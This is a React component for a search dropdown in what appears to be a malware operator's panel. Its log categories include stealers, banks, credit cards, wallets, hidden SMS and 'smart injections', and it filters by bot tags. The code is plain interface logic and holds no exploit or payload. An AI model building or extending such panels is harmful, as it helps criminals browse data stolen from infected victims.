import React, {Dispatch, SetStateAction, useLayoutEffect, useState} from "react";
import {Button, Checkbox, Dropdown, Form, Input, Menu, Select, Space} from "antd";
import {SearchOutlined} from "@ant-design/icons";
import {AppState} from "../../Store/RootReducer";
import {useLocation, useNavigate, useSearchParams} from "react-router-dom";
import {useTranslation} from "react-i18next";
import {errorNotify} from "../../Util/config";
import {useAppSelector} from "../../Hook/useAppSelector";

const {Option} = Select;

interface HeaderSearchProps {
    search: boolean,
    setSearch: Dispatch<SetStateAction<boolean>>
}

const HeaderSearch: React.FC<HeaderSearchProps> = (props: HeaderSearchProps) => {
    const [form] = Form.useForm();
    const navigate = useNavigate();
    const {t} = useTranslation();
    const [checkAllTypes, setCheckAllTypes] = useState(true);

    const location = useLocation();

    const [searchParams] = useSearchParams();

    const searchQuery = searchParams.get("query");
    const searchTypes = searchParams.get("types");
    const searchTags = searchParams.get("tags");

    useLayoutEffect(() => {
        if (location.pathname === "/search") {
            form.setFieldsValue({
                search_query: searchQuery,
                search_logs_type: searchTypes?.split(","),
                search_bots_tags: searchTags?.split(","),
            });
        }
    }, [searchQuery, searchTypes, searchTags, location]);

    const logTypes = [
        {
            name: "otheraccounts",
            alias: t("GET_ACCOUNTS"),
        },
        {
            name: "banks",
            alias: t("SIDEBAR_NAV_BANKS"),
        },
        {
            name: "credit_cards",
            alias: t("SIDEBAR_NAV_CARDS"),
        },
        {
            name: "crypt",
            alias: t("SIDEBAR_NAV_CRYPT"),
        },
        {
            name: "emails",
            alias: t("SIDEBAR_NAV_EMAIL"),
        },
        {
            name: "stealers",
            alias: t("SIDEBAR_NAV_STEALER"),
        },
        {
            name: "hidesms",
            alias: t("HIDE_SMS"),
        },
        {
            name: "wallets",
            alias: t("SIDEBAR_NAV_WALLET"),
        },
        {
            name: "shops",
            alias: t("SIDEBAR_NAV_SHOPS"),
        },
        {
            name: "smart_injections",
            alias: t("SIDEBAR_NAV_SMART_INJECTIONS"),
        },
    ];

    const authReducer = useAppSelector((state: AppState) => state.auth);

    const searchFormSubmit = () => {
        const search_query = form.getFieldValue("search_query");
        const search_type = form.getFieldValue("search_logs_type");
        const search_tags = form.getFieldValue("search_bots_tags");

        if (search_query && search_query.length > 0) {
            navigate(`/search?query=${search_query}&types=${search_type}&tags=${search_tags}`);

            props.setSearch(false);

            window.scrollTo(0, 0);
        } else {
            errorNotify("Search", "Query can't be empty");
        }
    };

    const unCheckTypes = () => {
        setCheckAllTypes(false);
        form.setFieldsValue({
            search_logs_type: "",
        });
    };

    const checkTypes = () => {
        setCheckAllTypes(true);

        form.setFieldsValue({
            search_logs_type: logTypes.map((item) => item.name),
        });
    };

    const handleVisibleChange = (flag: boolean) => props.setSearch(flag);

    const searchFormKeyPressHandle = (key: React.KeyboardEvent<HTMLFormElement>) => key.key === "Enter" && form.submit();

    const validateLength = (checked: string[], message: string) => {
        if (checked.length === 0) {
            return Promise.reject(new Error(message));
        }
    };

    const searchFormOverlay = (
        <Menu className="search-drop-menu">
            <Menu.Item key={0} className="search-drop-menu-item">
                <div className="search-drop-close" onClick={() => props.setSearch(false)}>
                    <i className="fa-solid fa-close"/>
                </div>

                <Form
                    form={form}
                    layout="vertical"
                    onFinish={searchFormSubmit}
                    onClick={(e) => e.stopPropagation()}
                    onKeyPress={(key) => searchFormKeyPressHandle(key)}
                >
                    <div className="search-drop">
                        <div className="search-drop-header">
                            {t("HEADER_SEARCH_PLACEHOLDER")}
                        </div>

                        <Form.Item className="search_query_input" name="search_query" rules={[{
                            required: true,
                            message: t("EMPTY_FIELD"),
                        }, {
                            min: 4,
                            message: t("MIN_4_SYMBOLS"),
                        }]}>
                            <Input
                                prefix={<SearchOutlined/>}
                                placeholder={t("HEADER_SEARCH_PLACEHOLDER")}
                                size="large"
                            />
                        </Form.Item>

                        <Form.Item
                            name="search_logs_type"
                            label={t("TYPES")}
                            initialValue={logTypes.map((item) => item.name)}
                            rules={[
                                {
                                    validator: async (_, checked) => {
                                        return validateLength(checked, t("SELECT_MINIMUM_ONE_LOG_TYPE"));
                                    },
                                },
                            ]}
                        >
                            <Checkbox.Group className="checkbox-group">
                                {logTypes.map((item, id) => (
                                    <Checkbox value={item.name} key={id}>{item.alias}</Checkbox>
                                ))}
                            </Checkbox.Group>
                        </Form.Item>

                        {checkAllTypes ? (
                            <a onClick={unCheckTypes} style={{margin: "-8px 0 15px 0", display: "table"}}>
                                <i className="fa-regular fa-square"/>&nbsp;
                                {t("UNCHECK_ALL")}
                            </a>
                        ) : (
                            <a onClick={checkTypes} style={{margin: "-8px 0 15px 0", display: "table"}}>
                                <i className="fa-regular fa-square-check"/>&nbsp;
                                {t("CHECK_ALL")}
                            </a>
                        )}

                        <Form.Item
                            name="search_bots_tags"
                            label={t("TAGS")}
                            initialValue={authReducer.user.tags}
                            rules={[
                                {
                                    validator: async (_, selected) => {
                                        return validateLength(selected, t("SELECT_MINIMUM_ONE_LOG_TYPE"));
                                    },
                                },
                            ]}
                        >
                            <Select
                                mode="multiple"
                                maxTagCount={4}
                                className="panel-select"
                                allowClear={true}
                            >
                                {authReducer.user.tags.map((tag, id) => (
                                    <Option value={tag} key={id}>
                                        {tag}
                                    </Option>
                                ))}
                            </Select>
                        </Form.Item>

                        <Space className="search-drop-footer">
                            <Button
                                type="primary"
                                onClick={() => props.setSearch(false)}
                                danger
                            >
                                {t("CLOSE")}
                            </Button>
                            <Button icon={<SearchOutlined/>} type="primary" onClick={() => form.submit()}>
                                {t("FIND")}...
                            </Button>
                        </Space>
                    </div>
                </Form>
            </Menu.Item>
        </Menu>
    );

    return (
        <div className="header-search">
            <Dropdown
                overlay={searchFormOverlay}
                trigger={["click"]}
                className="search-drop-menu"
                onOpenChange={handleVisibleChange}
                open={props.search}
            >
                <Button
                    icon={<SearchOutlined/>}
                    type="primary"
                    size="large"
                    // shape="circle"
                />
            </Dropdown>
        </div>
    );
};

export default HeaderSearch;
